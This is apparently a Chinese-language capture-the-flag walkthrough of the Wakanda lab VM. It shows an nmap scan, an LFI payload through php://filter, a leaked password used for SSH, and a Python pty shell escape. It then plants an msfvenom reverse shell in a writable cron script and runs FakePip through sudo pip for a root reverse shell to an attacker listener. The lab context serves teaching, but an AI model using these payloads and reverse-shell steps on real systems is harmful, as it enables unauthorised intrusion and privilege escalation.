# Wakanda 靶机实践

## 0x01 渗透过程

```arp-scan-l ```得到靶机地址192.168.31.154

信息搜集

```
nmap -A -p- 192.168.31.154
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-23 15:18 CST
Nmap scan report for 192.168.31.154
Host is up (0.00041s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Vibranium Market
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          40963/tcp   status
|   100024  1          41052/udp   status
|   100024  1          52522/tcp6  status
|_  100024  1          57819/udp6  status
3333/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 1c:98:47:56:fc:b8:14:08:8f:93:ca:36:44:7f:ea:7a (DSA)
|   2048 f1:d5:04:78:d3:3a:9b:dc:13:df:0f:5f:7f:fb:f4:26 (RSA)
|   256 d8:34:41:5d:9b:fe:51:bc:c6:4e:02:14:5e:e1:08:c5 (ECDSA)
|_  256 0e:f5:8d:29:3c:73:57:c7:38:08:6d:50:84:b6:6c:27 (ED25519)
40963/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:78:4B:17 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

访问一下web服务

看一下源代码

发现有个lang参数

存在LFI漏洞

```
payload=/?lang=php://filter/convert.base64-encode/resource=index
```

先读一下已知文件的源码

> Tips:
>
> 读取对应文件可以用如下命令行简化操作
>
> ```
> curl http://192.168.xxx.xxx/?lang=php://filter/convert.base64-encode/resource=index | head -n 1 | base64 -d > index.php
> ```

```php+HTML
//index.php
<?php
$password ="Niamey4Ever227!!!" ;//I have to remember it

if (isset($_GET['lang']))
{
include($_GET['lang'].".php");
}

?>



<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Vibranium market">
    <meta name="author" content="mamadou">

    <title>Vibranium Market</title>


    <link href="bootstrap.css" rel="stylesheet">

    
    <link href="cover.css" rel="stylesheet">
  </head>

  <body class="text-center">

    <div class="cover-container d-flex w-100 h-100 p-3 mx-auto flex-column">
      <header class="masthead mb-auto">
        <div class="inner">
          <h3 class="masthead-brand">Vibranium Market</h3>
          <nav class="nav nav-masthead justify-content-center">
            <a class="nav-link active" href="#">Home</a>
            <!-- <a class="nav-link active" href="?lang=fr">Fr/a> -->
          </nav>
        </div>
      </header>

      <main role="main" class="inner cover">
        <h1 class="cover-heading">Coming soon</h1>
        <p class="lead">
          <?php
            if (isset($_GET['lang']))
          {
          echo $message;
          }
          else
          {
            ?>

            Next opening of the largest vibranium market. The products come directly from the wakanda. stay tuned!
            <?php
          }
?>
        </p>
        <p class="lead">
          <a href="#" class="btn btn-lg btn-secondary">Learn more</a>
        </p>
      </main>

      <footer class="mastfoot mt-auto">
        <div class="inner">
          <p>Made by<a href="#">@mamadou</a></p>
        </div>
      </footer>
    </div>



  

</body></html>
```

```php
//fr.php
<?php

$message="Prochaine ouverture du plus grand marché du vibranium. Les produits viennent directement du wakanda. Restez à l'écoute!"
```

拿到一个不知道用在哪的密码

```php
$password ="Niamey4Ever227!!!" ;//I have to remember it
```

试一下ssh(nmap中扫出的端口号是3333)

成功连上去了

发现是个python命令行

拿到第一个flag

```
You are now leaving help and returning to the Python interpreter.     
If you want to ask for help on a particular object directly from the  
interpreter, you can type "help(object)".  Executing "help('string')" 
has the same effect as typing a particular string at the help> prompt.
>>> os.system("ls")                                                   
Traceback (most recent call last):                                    
  File "<stdin>", line 1, in <module>                                 
NameError: name 'os' is not defined                                   
>>> import os                                                         
>>> os.system("ls")                                                   
flag1.txt                                                             
0                                                                     
>>> os.system("cat fla*")                                             
                                                                      
Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc                               
0                                                                     
```

或者也可利用下面命令切换到熟悉的bash环境

```python
import pty
pty.spawn("/bin/bash")
```

遗憾的是这个用户并不能sudo

```
mamadou@Wakanda1:~$ sudo -l
[sudo] password for mamadou:
Sorry, user mamadou may not run sudo on Wakanda1.
```

/home目录下还有个用户devops

> Tips:
>
> 可以利用
>
> ```bash
> find / -user devops 2>/dev/null
> ```
>
> 其中2>/dev/null是不显示出错（权限不足）的提示信息

发现/srv/.antivirus.py是可写的

如果会定时执行的化就可以写个反弹shell了

可以用msfvenom自动生成脚本

```bash
msfvenom -p cmd/unix/reverse_python lhost=<攻击机的地址> lport=2333 R
```

写入之后过一段时间我们就能连上主机了（以devops的身份

```bash
nc -lvp 2333
listening on [any] 2333 ... 
192.168.31.154: inverse host lookup failed: Unknown host
connect to [192.168.31.51] from (UNKNOWN) [192.168.31.154] 34839
j
/bin/bash: line 1: j: command not found
ls
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
```

在/home/devops下拿到flag2.txt

最后一步就是提权到root了

```
sudo -l 
Matching Defaults entries for devops on Wakanda1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User devops may run the following commands on Wakanda1:
    (ALL) NOPASSWD: /usr/bin/pip
```

sudo -l发现我们可以用 /usr/bin/pip

关于这个命令

有Fakepip这个工具可以利用

```
root@kali:~# git clone https://github.com/0x00-0x00/FakePip.git
Cloning into 'FakePip'...
remote: Enumerating objects: 23, done.
remote: Total 23 (delta 0), reused 0 (delta 0), pack-reused 23
Unpacking objects: 100% (23/23), done.
root@kali:~# cd FakePip/
root@kali:~/FakePip# vim setup.py
```

因为服务器上没有git,根据对应地址修改脚本然后再利用攻击机的web服务上传到服务器上

```
root@kali:~/FakePip# python -m SimpleHTTPServer 80

wget <攻击机地址>/setup.py
```

或者也可以复制脚本内容“手工上传”到靶机上

利用exp提供的方法可以获得root的反弹shell

```bash
sudo /usr/bin/pip install . --upgrade --force-reinstall
Unpacking /home/devops
  Running setup.py (path:/tmp/pip-GX4_KQ-build/setup.py) egg_info for package from file:///home
    
Installing collected packages: FakePip
  Found existing installation: FakePip 0.0.1
    Uninstalling FakePip:
      Successfully uninstalled FakePip
  Running setup.py install for FakePip

nc -lvp 13372 #攻击机
listening on [any] 13372 ...
192.168.31.154: inverse host lookup failed: Unknown host
connect to [192.168.31.51] from (UNKNOWN) [192.168.31.154] 35263
root@Wakanda1:/tmp/pip-GX4_KQ-build# cat /root/root.txt
```

提权成功